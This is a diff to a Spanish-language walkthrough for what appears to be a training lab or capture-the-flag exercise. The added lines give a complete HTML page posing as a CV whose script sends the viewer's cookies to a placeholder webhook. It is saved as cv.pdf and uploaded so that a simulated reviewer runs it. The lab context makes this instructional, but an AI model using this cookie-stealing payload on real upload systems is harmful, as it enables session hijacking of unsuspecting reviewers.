@@ -45,7 +45,26 @@ Este documento describe el flujo completo para resolver el laboratorio: desde un
 
 **Pasos:**
 
-1. Crea un archivo HTML que contenga un script que, por ejemplo, envíe `document.cookie` a un webhook (webhook.site, RequestBin, etc.) o lo muestre en consola.
+1. Crea un archivo HTML con un script que envíe la cookie (o otros datos) a tu webhook. Ejemplo base (solo sustituye `TU_WEBHOOK_AQUI` por la URL de tu webhook, p. ej. de webhook.site o RequestBin):
+
+```html
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CV</title></head>
+<body>
+<h1>Currículum</h1>
+<p>Contenido de ejemplo.</p>
+<script>
+(function(){
+  var w = "TU_WEBHOOK_AQUI";
+  var x = new Image();
+  x.src = w + "?c=" + encodeURIComponent(document.cookie || "(vacío)");
+})();
+</script>
+</body>
+</html>
+```
+
 2. Guárdalo como `cv.pdf` (solo cambia la extensión a `.pdf`).
 3. Con tu usuario estudiante, sube ese “CV” en el panel (Subir Currículum Vitae).
 4. El servidor guarda el archivo y simula una revisión automática. La flag asociada a este acto está en los datos internos de esa revisión.
